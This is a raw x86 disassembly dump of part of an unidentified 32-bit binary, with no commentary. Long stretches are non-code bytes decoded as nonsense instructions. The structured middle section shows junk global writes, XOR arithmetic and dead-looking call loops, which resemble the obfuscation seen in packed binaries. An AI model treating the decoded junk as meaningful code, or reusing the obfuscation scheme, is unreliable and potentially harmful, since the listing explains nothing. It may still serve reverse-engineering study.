  411995:	sahf   
  411996:	mov    ebp,0x1cf3925e
  41199b:	dec    esi
  41199c:	xchg   ecx,eax
  41199d:	add    al,0xe1
  41199f:	loop   0x411955
  4119a1:	mov    cl,0x7a
  4119a3:	je     0x411990
  4119a5:	jmp    0x9812:0x3478c179
  4119ac:	pushf  
  4119ad:	aam    0xf7
  4119af:	rol    BYTE PTR [edx+0x2625c773],0x51
  4119b6:	(bad)  
  4119b7:	imul   ebp,DWORD PTR [edi],0x541f33b1
  4119bd:	les    edx,FWORD PTR [eax]
  4119bf:	retf   
  4119c0:	pusha  
  4119c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119c2:	sti    
  4119c3:	pop    esi
  4119c4:	mov    bx,0xf061
  4119c8:	sbb    BYTE PTR [esi],0xf
  4119cb:	aaa    
  4119cc:	cmp    ebp,esi
  4119ce:	mov    ah,0xd9
  4119d0:	jg     0x411967
  4119d2:	xchg   ebp,eax
  4119d3:	daa    
  4119d4:	shl    DWORD PTR [edx+0x4a],1
  4119d7:	push   esi
  4119d8:	shl    DWORD PTR [eax],cl
  4119da:	in     al,0xbc
  4119dc:	je     0x41198b
  4119de:	sub    al,0xf7
  4119e0:	inc    eax
  4119e1:	cs pop edx
  4119e3:	push   0x79658570
  4119e8:	and    DWORD PTR ss:[edx+0x36],0x36abedb0
  4119f0:	push   eax
  4119f1:	mov    edi,0x1ef6d4b1
  4119f6:	popa   
  4119f7:	inc    esp
  4119f8:	xchg   DWORD PTR [esi-0x4b],ebx
  4119fb:	es cli 
  4119fd:	ret    
  4119fe:	adc    eax,0xef6a9eec
  411a03:	dec    esi
  411a04:	mov    eax,ds:0xdfdc86dd
  411a09:	pop    edi
  411a0a:	lods   eax,DWORD PTR ds:[esi]
  411a0b:	pop    esp
  411a0c:	add    ecx,DWORD PTR [ebx]
  411a0e:	outs   dx,BYTE PTR ds:[esi]
  411a0f:	xchg   edi,eax
  411a10:	pop    ecx
  411a11:	lods   al,BYTE PTR ds:[esi]
  411a12:	in     eax,0x39
  411a14:	in     eax,0xc2
  411a16:	mov    ebx,0x61e6435e
  411a1b:	add    al,0x57
  411a1e:	inc    DWORD PTR [esi+0x58]
  411a21:	aaa    
  411a22:	pop    edx
  411a23:	dec    edx
  411a24:	cmp    eax,0xa8bd1f8b
  411a29:	jnp    0x4119e4
  411a2b:	xchg   esp,eax
  411a2c:	mov    al,BYTE PTR [eax]
  411a2e:	add    BYTE PTR [esi+0x33],ah
  411a31:	dec    esp
  411a32:	xchg   edi,eax
  411a33:	add    al,BYTE PTR [ecx+0x42867b25]
  411a39:	add    BYTE PTR [eax],al
  411a3b:	add    BYTE PTR [eax],al
  411a3d:	add    cl,ch
  411a3f:	or     eax,0x8b000000
  411a44:	cmp    eax,0x42867b
  411a49:	inc    edi
  411a4a:	mov    DWORD PTR ds:0x42867b,edi
  411a50:	cmp    DWORD PTR ds:0x42867b,0x1d
  411a57:	jae    0x411a7f
  411a5d:	cmp    DWORD PTR ds:0x42867b,0x24
  411a64:	ja     0x411a7f
  411a6a:	jmp    0x411a7a
  411a6f:	push   0x42801b
  411a74:	call   DWORD PTR ds:0x4287c3
  411a7a:	jmp    0x411a43
  411a7f:	mov    edi,0x3b56
  411a84:	adc    DWORD PTR ds:0x428657,0x6690
  411a8e:	add    cx,di
  411a91:	sub    DWORD PTR ds:0x42863f,0x428617
  411a9b:	movzx  ecx,cx
  411a9e:	xor    DWORD PTR ds:0x428633,0x428667
  411aa8:	mov    DWORD PTR [ebp-0xc],ecx
  411aab:	or     DWORD PTR ds:0x42862f,edx
  411ab1:	mov    ecx,DWORD PTR [ebp+0x8]
  411ab4:	movzx  ecx,WORD PTR [ecx+edx*4]
  411ab8:	add    DWORD PTR ds:0x4285e7,0xc83
  411ac2:	xor    ecx,0x8a94
  411ac8:	sub    DWORD PTR ds:0x42860f,0x428677
  411ad2:	add    ecx,edi
  411ad4:	mov    edi,DWORD PTR [ebp-0xc]
  411ad7:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411ade:	inc    edx
  411adf:	mov    ecx,DWORD PTR [ebp-0x10]
  411ae2:	mov    DWORD PTR ds:0x428637,0x76f
  411aec:	cmp    edx,ecx
  411aee:	mov    DWORD PTR ds:0x428647,0x6bd4
  411af8:	jne    0x40f686
  411afe:	and    DWORD PTR ds:0x428647,0x0
  411b08:	mov    ecx,DWORD PTR ds:0x428647
  411b0e:	inc    ecx
  411b0f:	mov    DWORD PTR ds:0x428647,ecx
  411b15:	cmp    DWORD PTR ds:0x428647,0x1b
  411b1c:	jbe    0x411b4e
  411b22:	jmp    0x411b41
  411b27:	push   0x428603
  411b2c:	push   DWORD PTR [ebp-0x14]
  411b2f:	push   DWORD PTR [ebp-0x28]
  411b32:	push   DWORD PTR [ebp-0x10]
  411b35:	push   DWORD PTR [ebp-0x10]
  411b38:	push   DWORD PTR [ebp-0x20]
  411b3b:	call   DWORD PTR ds:0x4287c7
  411b41:	cmp    DWORD PTR ds:0x428647,0x17
  411b48:	jb     0x411b08
  411b4e:	mov    ecx,DWORD PTR [ebp-0x18]
  411b51:	xor    edi,edi
  411b53:	mov    edx,DWORD PTR [ebp+0x10]
  411b56:	adc    DWORD PTR ds:0x42864b,ecx
  411b5c:	xor    ecx,eax
  411b5e:	add    ecx,esi
  411b60:	mov    DWORD PTR [edx],ecx
  411b62:	mov    ecx,DWORD PTR [ebp-0x18]
  411b65:	xor    ecx,eax
  411b67:	add    ecx,esi
  411b69:	adc    DWORD PTR ds:0x4285d7,ebx
  411b6f:	mov    DWORD PTR [ebp-0xc],ecx
  411b72:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  411b79:	adc    edi,DWORD PTR ds:0x428663
  411b7f:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  411b86:	or     DWORD PTR ds:0x42866b,ebx
  411b8c:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  411b93:	sub    DWORD PTR ds:0x428673,edx
  411b99:	mov    ecx,DWORD PTR [ebp-0x14]
  411b9c:	and    DWORD PTR ds:0x428637,edi
  411ba2:	mov    DWORD PTR [ebp+0x8],ecx
  411ba5:	mov    ecx,DWORD PTR [ebp+0x8]
  411ba8:	mov    edi,DWORD PTR ds:0x42865f
  411bae:	adc    DWORD PTR ds:0x428613,edi
  411bb4:	xor    ecx,eax
  411bb6:	add    ecx,esi
  411bb8:	mov    ecx,0x242ebcc
  411bbd:	mov    DWORD PTR ds:0x428613,0x3550
  411bc7:	mov    edi,0xf641bc3
  411bcc:	mov    DWORD PTR ds:0x428633,0x2c84
  411bd6:	je     0x41b172
  411bdc:	mov    ebx,DWORD PTR ds:0x4286b7
  411be2:	mov    edx,DWORD PTR ds:0x4286e3
  411be8:	sub    edx,ebx
  411bea:	imul   ebx,DWORD PTR [ebx+edx*1]
  411bee:	mov    edx,DWORD PTR [ebp+0x8]
  411bf1:	movzx  ebx,BYTE PTR ds:0x4285ef
  411bf8:	sub    DWORD PTR ds:0x428657,ebx
  411bfe:	mov    ebx,DWORD PTR [ebp-0x8]
  411c01:	adc    DWORD PTR ds:0x42860f,0x4285eb
  411c0b:	xor    edx,eax
  411c0d:	sub    DWORD PTR ds:0x428643,0x428673
  411c17:	xor    ebx,eax
  411c19:	sub    edx,ebx
  411c1b:	and    DWORD PTR ds:0x42866f,ecx
  411c21:	sub    edx,esi
  411c23:	xor    edx,eax
  411c25:	adc    DWORD PTR ds:0x42865b,ebx
  411c2b:	mov    DWORD PTR [ebp+0x8],edx
  411c2e:	mov    edx,DWORD PTR ds:0x42867f
  411c34:	mov    ebx,DWORD PTR ds:0x4286fb
  411c3a:	sub    ebx,edx
  411c3c:	imul   edx,DWORD PTR [edx+ebx*1]
  411c40:	mov    edx,DWORD PTR [ebp+0x8]
  411c43:	and    DWORD PTR ds:0x428647,0x0
  411c4d:	jmp    0x411c61
  411c52:	xor    ebx,ebx
  411c54:	xor    ebx,DWORD PTR ds:0x428647
  411c5a:	inc    ebx
  411c5b:	mov    DWORD PTR ds:0x428647,ebx
  411c61:	cmp    DWORD PTR ds:0x428647,0x14
  411c68:	jae    0x411cb1
  411c6e:	cmp    DWORD PTR ds:0x428647,0xc
  411c75:	jle    0x411cb1
  411c7b:	jmp    0x411c90
  411c80:	push   0x4285d3
  411c85:	push   0x42800b
  411c8a:	call   DWORD PTR ds:0x4287cb
  411c90:	cmp    DWORD PTR ds:0x428647,0xb
  411c97:	jne    0x411cac
  411c9d:	xor    ebx,ebx
  411c9f:	xor    ebx,DWORD PTR ds:0x428647
  411ca5:	inc    ebx
  411ca6:	mov    DWORD PTR ds:0x428647,ebx
  411cac:	jmp    0x411c52
  411cb1:	mov    ebx,DWORD PTR [ebp-0x58]
  411cb4:	not    DWORD PTR ds:0x4285e3
  411cba:	add    edx,0x5708f1
  411cc0:	sbb    DWORD PTR ds:0x42866f,0xe9d
  411cca:	imul   edx,ebx
  411ccd:	mov    DWORD PTR [ebp-0x58],edx
  411cd0:	mov    edx,DWORD PTR [ebp+0x8]
  411cd3:	movzx  ebx,WORD PTR ds:0x42863f
  411cda:	xor    DWORD PTR ds:0x428677,ebx
  411ce0:	mov    ebx,DWORD PTR [ebp-0x54]
  411ce3:	add    edx,0x64f893
  411ce9:	or     edx,ebx
  411ceb:	dec    ebx
  411cec:	mov    DWORD PTR [ebp-0x54],edx
  411cef:	mov    edx,DWORD PTR [ebp+0x8]
  411cf2:	xor    DWORD PTR ds:0x428613,edi
  411cf8:	mov    ebx,DWORD PTR [ebp-0x50]
  411cfb:	adc    DWORD PTR ds:0x42862b,0x428663
  411d05:	add    edx,ecx
  411d07:	xor    edx,ebx
  411d09:	inc    DWORD PTR ds:0x42864b
  411d0f:	mov    DWORD PTR [ebp-0x50],edx
  411d12:	sbb    DWORD PTR ds:0x42865f,0x428633
  411d1c:	mov    edx,DWORD PTR [ebp+0x8]
  411d1f:	add    DWORD PTR ds:0x42863f,0x2dae
  411d29:	mov    ebx,DWORD PTR [ebp-0x4c]
  411d2c:	add    edx,edi
  411d2e:	inc    DWORD PTR ds:0x428617
  411d34:	and    edx,ebx
  411d36:	and    ebx,0x7d1c
  411d3c:	mov    DWORD PTR [ebp-0x4c],edx
  411d3f:	xor    DWORD PTR ds:0x428613,0x4285ef
  411d49:	mov    edx,DWORD PTR [ebp+0x8]
  411d4c:	mov    ebx,DWORD PTR [ebp-0x48]
  411d4f:	lea    edx,[ebx+edx*1+0x241fcde]
  411d56:	mov    ebx,DWORD PTR ds:0x42863f
  411d5c:	and    DWORD PTR ds:0x428633,ebx
  411d62:	mov    DWORD PTR [ebp-0x48],edx
  411d65:	or     ebx,0x3ec
  411d6b:	mov    edx,DWORD PTR [ebp+0x8]
  411d6e:	mov    ebx,0xfa5e1521
  411d73:	or     DWORD PTR ds:0x428647,0x60bd
  411d7d:	sub    ebx,edx
  411d7f:	add    edx,DWORD PTR ds:0x42866f
  411d85:	add    ebx,DWORD PTR [ebp-0x44]
  411d88:	mov    DWORD PTR [ebp-0x44],ebx
  411d8b:	and    DWORD PTR ds:0x42867b,0x0
  411d95:	jmp    0x411da7
  411d9a:	mov    edx,DWORD PTR ds:0x42867b
  411da0:	inc    edx
  411da1:	mov    DWORD PTR ds:0x42867b,edx
  411da7:	cmp    DWORD PTR ds:0x42867b,0x18
  411dae:	jae    0x411dfe
  411db4:	cmp    DWORD PTR ds:0x42867b,0xa
  411dbb:	jge    0x411dfe
  411dc1:	jmp    0x411ddf
  411dc6:	push   DWORD PTR [ebp-0x14]
  411dc9:	push   DWORD PTR [ebp-0x20]
  411dcc:	push   0x73a3
  411dd1:	push   DWORD PTR [ebp-0xc]
  411dd4:	push   0x249b
  411dd9:	call   DWORD PTR ds:0x42879f
  411ddf:	cmp    DWORD PTR ds:0x42867b,0x9
  411de6:	jne    0x411df9
  411dec:	mov    edx,DWORD PTR ds:0x42867b
  411df2:	inc    edx
  411df3:	mov    DWORD PTR ds:0x42867b,edx
  411df9:	jmp    0x411d9a
  411dfe:	mov    edx,DWORD PTR [ebp+0x8]
  411e01:	adc    DWORD PTR ds:0x4285d3,0x42865b
  411e0b:	xor    edx,eax
  411e0d:	or     DWORD PTR ds:0x428657,0x7d10
  411e17:	add    edx,esi
  411e19:	mov    DWORD PTR ds:0x428613,0x2646
  411e23:	jne    0x411bdc
  411e29:	jmp    0x41b172
  411e2e:	and    ebx,DWORD PTR ds:0x428603
  411e34:	mov    edx,DWORD PTR [ebp-0xc]
  411e37:	sub    edx,esi
  411e39:	add    ebx,0x210e
  411e3f:	xor    edx,eax
  411e41:	mov    DWORD PTR [ebp-0x5c],edx
  411e44:	and    DWORD PTR ds:0x4285ef,0x0
  411e4e:	jmp    0x411e62
  411e53:	xor    ebx,ebx
  411e55:	add    ebx,DWORD PTR ds:0x4285ef
  411e5b:	inc    ebx
  411e5c:	mov    DWORD PTR ds:0x4285ef,ebx
  411e62:	cmp    DWORD PTR ds:0x4285ef,0x17
  411e69:	jae    0x411ea9
  411e6f:	cmp    DWORD PTR ds:0x4285ef,0xe
  411e76:	ja     0x411ea9
  411e7c:	jmp    0x411e8a
  411e81:	push   DWORD PTR [ebp-0xc]
  411e84:	call   DWORD PTR ds:0x4287a3
  411e8a:	cmp    DWORD PTR ds:0x4285ef,0xd
  411e91:	jne    0x411ea4
  411e97:	mov    ebx,DWORD PTR ds:0x4285ef
  411e9d:	inc    ebx
  411e9e:	mov    DWORD PTR ds:0x4285ef,ebx
  411ea4:	jmp    0x411e53
  411ea9:	mov    edx,DWORD PTR [ebp-0x10]
  411eac:	mov    DWORD PTR ds:0x4285db,0x15
  411eb6:	cmp    DWORD PTR ds:0x4285db,0x0
  411ebd:	je     0x411f11
  411ec3:	cmp    DWORD PTR ds:0x4285db,0x6
  411eca:	jl     0x411f11
  411ed0:	jmp    0x411ee5
  411ed5:	push   0x12dd
  411eda:	push   0x428000
  411edf:	call   DWORD PTR ds:0x4287a7
  411ee5:	cmp    DWORD PTR ds:0x4285db,0x7
  411eec:	jne    0x411eff
  411ef2:	mov    ebx,DWORD PTR ds:0x4285db
  411ef8:	dec    ebx
  411ef9:	mov    DWORD PTR ds:0x4285db,ebx
  411eff:	mov    ebx,DWORD PTR ds:0x4285db
  411f05:	dec    ebx
  411f06:	mov    DWORD PTR ds:0x4285db,ebx
  411f0c:	jmp    0x411eb6
  411f11:	mov    ebx,DWORD PTR [ebp-0x8]
  411f14:	xor    edx,eax
  411f16:	xor    DWORD PTR ds:0x42863b,0x3a5d
  411f20:	xor    ebx,eax
  411f22:	sub    edx,ebx
  411f24:	adc    DWORD PTR ds:0x42860f,0x428633
  411f2e:	sub    edx,esi
  411f30:	and    DWORD PTR ds:0x42864f,0x428607
  411f3a:	xor    edx,eax
  411f3c:	mov    DWORD PTR ds:0x428663,0x12b9
  411f46:	mov    DWORD PTR [ebp-0x10],edx
  411f49:	movzx  edx,WORD PTR ds:0x42863f
  411f50:	mov    edx,DWORD PTR [ebp-0x14]
  411f53:	mov    DWORD PTR [ebp+0x8],edx
  411f56:	jmp    0x414473
  411f5b:	adc    DWORD PTR ds:0x42866b,0x365a
  411f65:	mov    edx,DWORD PTR [ebp+0x8]
  411f68:	add    DWORD PTR ds:0x42865b,0x2d5e
  411f72:	mov    ebx,DWORD PTR [ebp-0x8]
  411f75:	xor    edx,eax
  411f77:	xor    ebx,eax
  411f79:	jmp    0x41431a
  411f7e:	push   0xf
  411f80:	xor    al,0x44
  411f82:	pop    ss
  411f83:	inc    edi
  411f84:	or     al,BYTE PTR [edi]
  411f86:	into   
  411f87:	addr16 mov ds:0x3af4,al
  411f8b:	gs inc edx
  411f8d:	ins    DWORD PTR es:[edi],dx
  411f8e:	mov    BYTE PTR [edx+0x5ffe7a7a],0x7a
  411f95:	jp     0x411fd0
  411f97:	add    BYTE PTR [ebp+0x79],dh
  411f9a:	cmp    al,cl
  411f9c:	add    BYTE PTR [eax+eax*2+0x7fbee4cd],bl
  411fa3:	jg     0x411fb7
  411fa5:	out    dx,eax
  411fa6:	jno    0x411fa1
  411fa8:	jae    0x411fdc
  411faa:	shr    al,cl
  411fac:	xchg   edi,eax
  411fad:	mov    ebp,0x9b451ccc
  411fb2:	enter  0x4304,0xe3
  411fb6:	mov    edi,DWORD PTR [esi]
  411fb8:	icebp  
  411fb9:	outs   dx,DWORD PTR ds:[esi]
  411fba:	(bad)  
  411fbb:	(bad)  
  411fbc:	data16 aas 
  411fbe:	in     al,dx
  411fbf:	iret   
  411fc0:	mov    DWORD PTR [eax-0x7e1ced1b],esp
  411fc6:	jnp    0x411fe0
  411fc8:	fld    DWORD PTR [ebp+0x28]
  411fcb:	inc    edi
  411fcc:	xchg   esp,eax
  411fcd:	stos   BYTE PTR es:[edi],al
  411fce:	push   ds
  411fcf:	lods   eax,DWORD PTR ds:[esi]
  411fd0:	push   ebp
  411fd1:	pop    ebp
  411fd2:	sub    DWORD PTR [ebp+0x3f],edx
  411fd5:	aaa    
  411fd6:	out    dx,al
  411fd7:	and    BYTE PTR [edi],0xe4
  411fda:	out    0x55,al
  411fdc:	lahf   
  411fdd:	inc    ecx
  411fde:	xchg   esi,eax
  411fdf:	pop    edi
  411fe0:	cmp    BYTE PTR [eax-0x94d3f75],0x84
  411fe7:	sbb    bh,BYTE PTR [ecx]
  411fe9:	xor    bl,BYTE PTR [edi+0x12e12d8f]
  411fef:	stos   BYTE PTR es:[edi],al
  411ff0:	xor    eax,0x114ca0d0
  411ff5:	dec    eax
  411ff6:	mov    bl,0x28
  411ff8:	or     al,0xbc
  411ffa:	out    0xf2,eax
  411ffc:	int3   
  411ffd:	clc    
  411ffe:	cdq    
  411fff:	adc    al,0xc5
  412001:	icebp  
  412002:	inc    esp
  412003:	shl    BYTE PTR [edi],cl
  412005:	fdivr  QWORD PTR ds:0xf51376f3
  41200b:	pop    ebp
  41200c:	cmp    eax,esp
  41200e:	dec    esp
  41200f:	push   eax
  412010:	hlt    
  412011:	scas   eax,DWORD PTR es:[edi]
  412012:	jns    0x411fa7
  412014:	add    eax,0x6ecd206
  412019:	imul   eax,DWORD PTR [eax+0x44],0xc93e56d4
  412020:	mov    ah,BYTE PTR [ebp+0x2f]
  412023:	ffreep st(5)
  412025:	fwait
  412026:	icebp  
  412027:	xchg   edx,eax
  412028:	pop    esp
  412029:	scas   al,BYTE PTR es:[edi]
  41202a:	jne    0x4120a1
  41202c:	jns    0x411fdd
  41202e:	and    al,0xe2
  412030:	mov    WORD PTR [ebx-0x7],?
  412033:	test   ebx,0xc62f1ed2
  412039:	mov    dh,0xb1
  41203b:	jbe    0x41200e
  41203d:	test   dl,dh
  41203f:	adc    DWORD PTR [edx+edx*4],ebp
  412042:	push   ss
  412043:	(bad)  
  412044:	call   0xc2eb495c
  412049:	jmp    0x326447e2
  41204e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41204f:	mov    ecx,0x68fb5229
  412054:	lds    eax,FWORD PTR [ebx]
  412056:	mov    al,ds:0xcf24207e
  41205b:	jbe    0x4120ba
  41205d:	int    0xe7
  41205f:	(bad)  
  412061:	sub    ebp,DWORD PTR [edx]
  412063:	xchg   DWORD PTR [edi+0x619e7409],ebp
  412069:	gs mov esp,0xffebabf1
  41206f:	and    al,0x33
  412071:	test   al,0xfd
  412073:	xor    BYTE PTR [edi-0x1e],0x21
  412077:	inc    edi
  412078:	dec    eax
  412079:	rcr    BYTE PTR [edx+0x5],1
  41207c:	mov    WORD PTR [esi+0x36],gs
  41207f:	loop   0x41209a
  412081:	out    dx,eax
  412082:	and    BYTE PTR [ebp+0x1b],al
  412085:	jge    0x412062
  412087:	adc    ebx,ebx
  412089:	cld    
  41208a:	out    0xe8,al
  41208c:	xchg   esp,eax
  41208d:	inc    eax
  41208e:	xchg   edx,eax
  41208f:	sahf   
  412090:	xchg   esi,eax
  412091:	and    cl,bh
  412093:	or     DWORD PTR [edi+0x254a8e42],0x15c1d007
  41209d:	pop    ebx
  41209e:	jbe    0x4120d8
  4120a0:	test   BYTE PTR [edi],cl
  4120a2:	test   eax,0x17d906eb
  4120a7:	jle    0x412049
  4120a9:	retf   0xec94
  4120ac:	xchg   ecx,eax
  4120ad:	adc    ch,ah
  4120af:	pop    esi
  4120b0:	daa    
  4120b1:	jmp    0x4120e8
  4120b3:	fdiv   DWORD PTR [ecx]
  4120b5:	stos   BYTE PTR es:[edi],al
  4120b6:	xor    cl,ah
  4120b8:	sub    bl,BYTE PTR [edx-0x7781ac80]
  4120be:	aas    
  4120bf:	repz out 0xf7,al
  4120c2:	sbb    ebp,DWORD PTR [edi+0x5d]
  4120c5:	popw   es
  4120c7:	test   eax,0xf14308ff
  4120cc:	cmp    al,0x2b
  4120ce:	sahf   
  4120cf:	clc    
  4120d0:	pop    ebx
  4120d1:	xor    ebx,DWORD PTR [edx]
  4120d3:	cmp    DWORD PTR [edx+eiz*1],esp
  4120d6:	mov    bh,0x62
  4120d8:	push   0xffffffb5
  4120da:	push   ss
  4120db:	mul    ecx
  4120dd:	lahf   
  4120de:	out    dx,eax
  4120df:	les    esi,FWORD PTR [esi-0x71]
  4120e2:	retf   
  4120e3:	inc    eax
  4120e4:	imul   ebp,DWORD PTR [ebx+0x2d],0x6479327b
  4120eb:	pop    ebp
  4120ec:	retf   0x639b
  4120ef:	xor    dh,BYTE PTR [ecx+0x63]
  4120f2:	ret    0xd571
  4120f5:	bound  ebx,QWORD PTR [ebx]
  4120f7:	push   ebx
  4120f8:	out    dx,al
  4120f9:	aaa    
  4120fa:	jbe    0x41208a
  4120fc:	or     esi,0xf54279b7
  412102:	push   ecx
  412103:	jl     0x412138
  412105:	add    cl,al
  412107:	lods   eax,DWORD PTR ds:[esi]
  412108:	mov    DWORD PTR [ecx+ebx*2-0x65],esp
  41210c:	mov    bh,0x31
  41210e:	jecxz  0x4120c3
  412110:	retf   
  412111:	push   ds
  412112:	mov    cl,0x5f
  412114:	cwde   
  412115:	jmp    0x41209b
  412117:	inc    edx
  412118:	push   cs
  412119:	inc    ecx
  41211a:	mov    ds:0xc0a2b9b3,al
  41211f:	in     eax,0xb7
  412121:	pop    ebx
  412122:	je     0x41211c
  412124:	pop    ebp
  412125:	add    eax,0x124aaa22
  41212a:	mov    eax,ds:0x9b66b60a
  41212f:	fcom   QWORD PTR ds:0xd95e1729
  412135:	sub    ecx,DWORD PTR [edx]
  412137:	add    DWORD PTR [edi],ecx
  412139:	cmp    dh,BYTE PTR [eax+0x3289959f]
  41213f:	push   0xffffffb6
  412141:	push   esi
  412142:	mov    ah,0x4c
  412144:	and    BYTE PTR fs:[esi-0x3a],bh
  412148:	pop    eax
  412149:	inc    ebx
  41214a:	jae    0x4121cb
  41214c:	popa   
  41214d:	mov    esi,0xf79b7789
  412152:	jns    0x41216e
  412154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412156:	mov    WORD PTR [esi-0x25],gs
  412159:	mov    dl,0xb1
  41215b:	cdq    
  41215c:	jge    0x412137
  41215e:	mov    ah,0xff
  412160:	aas    
  412161:	push   ebp
  412162:	fwait
  412163:	test   BYTE PTR [ebp-0xe4242a6],al
  412169:	mov    edx,0xc9befc02
  41216e:	fld    st(5)
  412170:	adc    BYTE PTR [esi],dh
  412172:	push   es
  412173:	push   0x5ae6075c
  412178:	mov    al,0x1d
  41217a:	test   DWORD PTR [edx-0x312a8055],ecx
  412180:	pop    edx
  412181:	fs dec esp
  412183:	jae    0x412152
  412185:	add    ch,BYTE PTR [ebx]
  412187:	xor    al,0x52
  412189:	pop    edi
  41218a:	repz jo 0x412133
  41218d:	stos   DWORD PTR es:[edi],eax
  41218e:	outs   dx,DWORD PTR ds:[esi]
  41218f:	mov    esi,0xf71349c8
  412194:	inc    ebp
  412195:	iret   
  412196:	xchg   BYTE PTR [ebp-0x6f6eb458],ah
  41219c:	fnstenv [edi-0x17]
  41219f:	fld    DWORD PTR [edx+0x30eb6701]
  4121a5:	xchg   BYTE PTR [ecx*8+0x29f7e2f6],cl
  4121ac:	(bad)  
  4121ad:	(bad)  
  4121ae:	mov    DWORD PTR [eax-0x54],ebx
  4121b1:	lgs    edi,FWORD PTR ds:0x563f40c4
  4121b8:	test   DWORD PTR [eax-0x51],ebp
  4121bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bc:	xor    edi,edi
  4121be:	push   edx
  4121bf:	push   cs
  4121c0:	sub    BYTE PTR [ebx],0x42
  4121c3:	jnp    0x412238
  4121c5:	inc    edx
  4121c6:	mov    al,ds:0xf9adbc53
  4121cb:	push   ebx
  4121cc:	int3   
  4121cd:	ins    DWORD PTR es:[edi],dx
  4121ce:	les    edx,FWORD PTR ss:[edi+ecx*8]
  4121d2:	fdivr  QWORD PTR [ecx]
  4121d4:	mov    ch,0xb4
  4121d6:	inc    esi
  4121d7:	stos   DWORD PTR es:[edi],eax
  4121d8:	jecxz  0x41223d
  4121da:	sbb    al,0x36
  4121dc:	test   BYTE PTR [ebx-0x71b56f45],0x51
  4121e3:	(bad)  
  4121e4:	dec    ebp
  4121e5:	dec    edi
  4121e6:	sub    eax,0x45e6bfea
  4121eb:	mov    DWORD PTR [ebp+0xc],esi
  4121ee:	ins    DWORD PTR es:[edi],dx
  4121ef:	mov    edi,0x9fc85bfd
  4121f4:	test   BYTE PTR [eax+0x0],dh
  4121f7:	imul   ecx,DWORD PTR [ebx],0x2e
  4121fa:	xlat   BYTE PTR ds:[ebx]
  4121fb:	sub    bl,BYTE PTR [ebx-0x701f964d]
  412201:	mov    ecx,0x704e1677
  412206:	pop    edx
  412207:	inc    edi
  412208:	dec    edi
  412209:	shr    DWORD PTR [edx+0x7af2d958],1
  41220f:	sbb    dl,dl
  412211:	fmul   QWORD PTR [ebp+ebp*8+0x5ae1416c]
  412218:	adc    al,0x40
  41221a:	pop    esp
  41221b:	jo     0x4121d0
  41221d:	mov    ecx,0x6d486152
  412222:	cmp    edx,DWORD PTR [ebp-0x5067348e]
  412228:	bound  esp,QWORD PTR [eax+ebx*2+0x74]
  41222c:	adc    BYTE PTR [ebx],dh
  41222e:	femms  
  412230:	jne    0x4121ec
  412232:	dec    ebx
  412233:	fnstenv [edi]
  412235:	in     al,0xbb
  412237:	dec    ebx
  412238:	push   ebx
  412239:	pop    ss
  41223a:	mov    al,0x79
  41223c:	in     al,dx
  41223d:	repnz out dx,eax
  41223f:	imul   eax,DWORD PTR [ebx+0x20b30070],0x74
  412246:	mov    ebx,0xa71e0497
  41224b:	inc    BYTE PTR [ecx]
  41224d:	imul   edx,DWORD PTR [edi+eiz*1-0x1f],0xe319dc38
  412255:	icebp  
  412256:	inc    ebp
  412257:	or     cl,BYTE PTR [ecx+0x1e9858ef]
  41225d:	in     al,0xb8
  41225f:	push   ebx
  412260:	add    eax,0x480a0a94
  412265:	push   edx
  412266:	nop
  412267:	pop    ds
  412268:	enter  0x1ded,0x60
  41226c:	(bad)  [esi-0x1564d2a0]
  412272:	adc    ah,BYTE PTR [ebp+0x2e42f63f]
  412278:	ret    0x3849
  41227b:	mov    dh,0x28
  41227d:	adc    ah,BYTE PTR [eax-0x5f]
  412280:	jmp    ebp
  412282:	adc    ch,BYTE PTR [ebx+0x69]
  412285:	pop    es
  412286:	dec    DWORD PTR [ebx+0x35648431]
  41228c:	adc    ah,dh
  41228e:	sti    
  41228f:	pop    ebx
  412290:	dec    esp
  412291:	add    bh,bh
  412293:	jmp    0xd02caf5a
  412298:	aaa    
  412299:	addr16 aam 0xf8
  41229c:	int    0x26
  41229e:	rol    DWORD PTR [edi+0x73d672a4],1
  4122a4:	int3   
  4122a5:	je     0x412238
  4122a7:	in     al,dx
  4122a8:	cmp    eax,0x175473b4
  4122ad:	sbb    DWORD PTR [eax-0x8],0x9
  4122b1:	mov    al,0xa5
  4122b3:	mov    ecx,0xc4ee91b
  4122b8:	stc    
  4122b9:	das    
  4122ba:	push   edx
  4122bb:	or     BYTE PTR [ebp+eiz*4+0x6b],bh
  4122bf:	push   ss
  4122c0:	mov    eax,0xb004cb2a
  4122c5:	repz sbb DWORD PTR [esi],0xbfaafc12
  4122cc:	into   
  4122cd:	(bad)  
  4122cf:	shr    DWORD PTR [ecx],1
  4122d1:	js     0x4122bf
  4122d3:	xchg   edx,eax
  4122d4:	jns    0x41233b
  4122d6:	dec    ebx
  4122d7:	icebp  
  4122d8:	cwde   
  4122d9:	je     0x4122af
  4122db:	fisub  WORD PTR [eax]
  4122dd:	cmp    eax,0xd762627
  4122e2:	xchg   DWORD PTR [ecx+0x18],edi
  4122e5:	xchg   ecx,eax
  4122e6:	push   0x72
  4122e8:	mov    ds:0x9efce883,al
  4122ed:	push   es
  4122ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122ef:	daa    
  4122f0:	gs add eax,0x654b09de
  4122f6:	or     al,0xce
  4122f8:	push   edi
  4122f9:	loopne 0x4122ce
  4122fb:	sbb    BYTE PTR [ecx+0x40],cl
  4122fe:	pop    ecx
  4122ff:	add    dh,BYTE PTR [eax+0x79]
  412302:	cmp    eax,0x3ca7f537
  412307:	cmc    
  412308:	mov    ah,0x3b
  41230a:	jl     0x412349
  41230c:	ss cli 
  41230e:	enter  0x4729,0x6
  412312:	and    cl,dh
  412314:	in     al,dx
  412315:	lock inc ebx
  412317:	fdiv   st,st(1)
  412319:	cs pop esp
  41231b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41231d:	je     0x412345
  41231f:	xchg   ebp,eax
  412320:	scas   al,BYTE PTR es:[edi]
  412321:	mov    dh,0x71
  412323:	aam    0xd1
  412325:	scas   al,BYTE PTR es:[edi]
  412326:	push   cs
  412327:	mov    ebp,0x5d87b036
  41232c:	push   eax
